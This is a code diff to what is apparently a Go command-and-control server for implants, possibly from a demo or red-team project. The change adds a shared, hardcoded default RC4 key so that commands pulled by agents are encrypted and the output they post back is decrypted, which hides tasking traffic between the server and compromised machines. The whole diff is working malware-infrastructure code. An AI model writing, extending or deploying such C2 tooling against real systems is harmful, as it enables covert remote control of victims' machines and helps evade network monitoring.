@@ -29,15 +29,20 @@ type Registry struct {
 	mu     sync.Mutex
 	agents map[string]*Agent
 	logf   func(format string, args ...any)
+	key    []byte // shared RC4 key (must match implant)
 }
 
-func newRegistry(logf func(string, ...any)) *Registry {
+func newRegistry(logf func(string, ...any), key []byte) *Registry {
 	if logf == nil {
 		logf = func(string, ...any) {}
+	}
+	if len(key) == 0 {
+		key = []byte("piclang-c2-demo-key")
 	}
 	return &Registry{
 		agents: make(map[string]*Agent),
 		logf:   logf,
+		key:    append([]byte(nil), key...),
 	}
 }
 
@@ -204,10 +209,15 @@ func (r *Registry) Handler() http.Handler {
 				w.WriteHeader(http.StatusNoContent)
 				return
 			}
+			wire, err := seal([]byte(cmd), r.key)
+			if err != nil {
+				http.Error(w, "seal failed", http.StatusInternalServerError)
+				return
+			}
 			r.logf("%s pulled command %q", shortID(id), truncate(cmd, 60))
 			w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 			w.WriteHeader(http.StatusOK)
-			_, _ = io.WriteString(w, cmd)
+			_, _ = io.WriteString(w, wire)
 
 		case http.MethodPost:
 			body, err := io.ReadAll(io.LimitReader(req.Body, maxBody))
@@ -215,8 +225,19 @@ func (r *Registry) Handler() http.Handler {
 				http.Error(w, "read body", http.StatusBadRequest)
 				return
 			}
-			r.logf("%s returned %d byte(s) of output", shortID(id), len(body))
-			a.pushResult(string(body))
+			plain, err := open(string(body), r.key)
+			if err != nil {
+				// still accept empty body as empty output
+				if len(body) == 0 {
+					plain = nil
+				} else {
+					r.logf("%s POST open failed: %v", shortID(id), err)
+					http.Error(w, "bad sealed body", http.StatusBadRequest)
+					return
+				}
+			}
+			r.logf("%s returned %d byte(s) of output", shortID(id), len(plain))
+			a.pushResult(string(plain))
 			w.WriteHeader(http.StatusNoContent)
 
 		default:
